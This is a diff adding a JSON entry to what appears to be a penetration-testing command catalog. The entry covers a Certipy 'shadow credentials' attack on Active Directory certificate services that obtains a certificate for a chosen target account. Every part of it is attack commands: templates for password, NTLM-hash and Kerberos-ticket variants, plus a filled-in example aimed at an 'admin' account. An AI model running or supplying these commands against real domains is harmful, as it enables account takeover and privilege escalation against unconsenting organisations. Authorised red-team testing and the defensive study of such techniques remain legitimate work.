@@ -1,0 +1,34 @@
+{
+  "id": "certipy-shadow",
+  "name": "Certipy Shadow Credentials",
+  "command": "certipy shadow auto -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -account '<target_user>'",
+  "description": "Abuse shadow credentials to obtain a certificate for a target account",
+  "platform": "linux",
+  "requires": [
+    "password"
+  ],
+  "protocols": [
+    "ldap"
+  ],
+  "tags": [
+    "certipy",
+    "adcs",
+    "shadow-credentials",
+    "msds-keycredentiallink"
+  ],
+  "variations": [
+    {
+      "label": "NTLM Hash",
+      "requires": "hash",
+      "command": "certipy shadow auto -u '<user>@<domain>' -hashes ':<hash>' -dc-ip <ip> -account '<target_user>'"
+    },
+    {
+      "label": "Kerberos Ticket",
+      "requires": "ticket",
+      "command": "certipy shadow auto -u '<user>@<domain>' -k -no-pass -dc-ip <ip> -account '<target_user>'"
+    }
+  ],
+  "examples": [
+    "certipy shadow auto -u 'user@corp.local' -p 'password' -dc-ip 192.168.1.100 -account 'admin'"
+  ]
+}
